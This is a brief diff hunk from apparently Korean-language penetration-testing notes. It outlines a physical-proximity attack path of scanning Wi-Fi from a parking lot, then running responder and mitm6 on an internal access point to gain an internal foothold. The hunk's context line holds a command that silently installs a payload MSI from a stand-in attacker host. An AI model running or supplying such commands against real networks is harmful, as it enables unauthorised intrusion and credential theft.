@@ -97,7 +97,7 @@ msiexec /q /i http://atk/payload.msi
 
 1. 주차장에서 guest / 회사 AP 스캔 → [Wireless](wireless.md)
 2. 내부 AP 붙자마자 responder / mitm6
-3. 이 시점부터 Assumed Breach 와 사실상 동일한 "내부망 진입" 달성
+3. 이 시점부터 Assumed Breach 와 동일한 "내부망 진입" 상태
 
 ---
 
